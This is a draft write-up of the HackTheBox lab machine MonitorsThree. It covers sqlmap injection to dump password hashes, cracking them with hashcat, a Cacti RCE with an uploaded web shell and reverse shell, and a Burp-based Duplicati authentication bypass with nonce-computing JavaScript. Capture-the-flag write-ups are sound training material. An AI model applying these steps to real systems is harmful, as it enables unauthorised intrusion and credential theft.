+++
title = 'MonitorsThree'
Topics = ['medium','linux']
date = 2024-11-26T19:01:10Z
draft = true
+++

# monitorsthree

![lesgo.png](/monitorsthree/lesgo.png)


## User

![etchosts](/monitorsthree/etchosts.png)
```
sudo bash -c "echo '10.10.11.30    monitorsthree.htb'>> /etc/hosts"
```
![port80](/monitorsthree/port80.png)
Can't see anything of interest off the bat lets do some enumeration

![cati](/monitorsthree/cacti.png)
```
ffuf -u http://monitorsthree.htb -H "Host:FUZZ.monitorsthree.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac
```
![app](/monitorsthree/cactiapp.png)
Found the app login section

![sql](/monitorsthree/sql.png)
The password recovery section was vulnerable to [sql injection](https://owasp.org/www-community/attacks/SQL_Injection)

![dbs](/monitorsthree/dbs.png)
```
sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --dbs
```


![tables](/monitorsthree/tables.png)
```
sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db --tables

```

![colums](/monitorsthree/colums.png)
```
sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -columns
```

![userspass](/monitorsthree/userspass.png)
```
sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -C username,password --dump
```

```
Database: monitorsthree_db
Table: users
[4 entries]
+-----------+----------------------------------+
| username  | password                         |
+-----------+----------------------------------+
| janderson | 1e68b6eb86b45f6d92f8f292428f77ac |
| admin     | 31a181c8372e3afc59dab863430610e8 |
| dthompson | 633b683cc128fe244b00f176c8a950f5 |
| mwatson   | c585d01f2eb3e6e1073e92023088a3dd |
+-----------+----------------------------------+
```

![crackstation](/monitorsthree/crackstation.png)
```
admin : greencacti2001
```

![credsboth](/monitorsthree/credsboth.png)
my creds for admin worked on both monitorsthree and the subdomain  cacti . monitorsthree 

![rce](/monitorsthree/rce.png)
I saw that cacti was running 1.2.26 and found a [rce](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88) for it 

![connection](/monitorsthree/connection.png)
I uploaded a [p0wny-shell](https://github.com/flozz/p0wny-shell) shell and tried out [revshells](revshell.com) until one got me a connection

![mysql](/monitorsthree/mysqlcreds.png)
I found a db file that had credentials for mysql

![creden](/monitorsthree/creden.png)
```
mysql -ucactiuser -pcactiuser -e "USE cacti;" -e "Select * from user_auth;"
```
I remeber the terminal being buggy so i just used the webshell
```
1	admin	$2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G	0	Administrator	marcus@monitorsthree.htb			on	on	on	on	2	1	1	1	1	on	-1	-1	-1		0	0	436423766
3	guest	$2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu	0	Guest Account	guest@monitorsthree.htb			on	on	on		1	1	1	1	1		-1	-1	-1		0	0	3774379591
4	marcus	$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK	0	Marcus	marcus@monitorsthree.htb		on	on	on	on	on	1	1	1	1	1	on	-1	-1			0	0	1677427318
```
![marcuscreds](/monitorsthree/marcuscreds.png)
```
hashcat -a 0 -m 3200 hash.txt /usr/share/seclists/rockyou.txt hash.txt -show
```
```
marcus : 12345678910
```


![ssnoworl](/monitorsthree/ssnowork.png)
Couldnt ssh into marcus

![id_rsa](/monitorsthree/id_rsassh.png)
Couldnt su in the webshell either so got the terminal again and got the ssh key and then used that to ssh in 


## Root

![netstat](/monitorsthree/netstat.png)
```
netstat -tnlp
```


![duplicati](/monitorsthree/duplicati.png)
```
ssh -i id_rsa marcus@10.10.11.30 -L 127.0.0.1:8080:127.0.0.1:8080

```

![auth bypass](/monitorsthree/authbypass.png)
Found a way to bypass the authentication 

![duplicati server](/monitorsthree/dserver.png)
First step was finding the duplicati server config


![server pass](/monitorsthree/serverpass.png)
```
Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
```
Next convert server passphrase from base64 to hex
![convert](/monitorsthree/base64-hex.png)
```
59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
```

![intercept](/monitorsthree/intercept.png)
turn on intercept on burp and then right click and hit "do intercept" "response to this request"


hit forward
![noncea](/monitorsthree/noncea.png)
make sure you mark down this nonce  (this will be diffrent for everyone)
```
wqCENkgcvVIlDPe9Q3HpaNhz+YXmYk8FNLoOQfIzCEM=
```



![formula](/monitorsthree/formula.png)
```
var saltedpwd = 'HexOutputFromCyberChef'; // Replace with the Hex output from step 6
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('NonceFromBurp') + saltedpwd)).toString(CryptoJS.enc.Base64); // Replace 'NonceFromBurp' with the intercepted nonce
console.log(noncedpwd);
```
our hex is the 59be string and our 'noncefromburp' is our wqCE


![nonced1](/monitorsthree/nonced1.png)
```
j65vMghwC8l+b+RjSm2VvMNsA43fKKsf/jnqDW5FfTo=

```
back on burp hit forward again
![password var](/monitorsthree/passwordvar.png)
we need to replace this 1ak variable with our 'j65vM' fully nonced string

![pasted in](/monitorsthree/pastedin.png)
then we need to url encode it
higlight it in burp and hit ctrl + u


![url encoded](/monitorsthree/urlencoded.png)

now were ready send it on


![adn were in](/monitorsthree/adnwerein.png)
we can turn intercept off and just focus on our browser now

![root txt ](/monitorsthree/root.txt.png)
What i did here was utilise the back up restoring software to restore the root.txt to marcus's folder

![pwnd](/monitorsthree/pwnd.png)






